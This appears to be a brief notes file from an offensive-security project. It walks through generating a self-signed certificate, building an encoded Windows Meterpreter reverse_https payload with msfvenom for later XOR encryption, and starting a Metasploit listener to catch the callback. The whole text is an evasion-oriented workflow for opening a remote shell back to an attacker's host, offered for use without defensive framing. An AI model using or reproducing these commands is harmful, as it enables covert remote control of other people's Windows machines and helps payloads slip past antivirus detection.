// Using Custom SSL/TLS certificate to encrypt xor shellcode

//Generate SSL Certificate

openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \ -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \ -keyout www.example.com.key \ -out www.example.com.crt && \ cat www.example.com.key  www.example.com.crt > www.example.com.pem && \ rm -f www.example.com.key  www.example.com.crt

//Now generate msfvenom shellcode to include ssl cert and encryption

msfvenom -p windows/x64/meterpreter/reverse_https lhost=<> lport=<> HandlerSSLCert=<www.example.com.pem> StagerVerifySSLCert=true -e x86/shikata_ga_nai -i 25 -f raw -o <output>

//Now follow steps from README to encrypt shellcode with XOR

//When setting up listener make sure to follow these steps

msfconsole

use multi/handler

set lhost <>

set lport <>

set StagerVerifySSLCert true

set HandlerSSLCert // path the SSL cert here

set StageEncoder x86/shikata_ga_nai

exploit -j

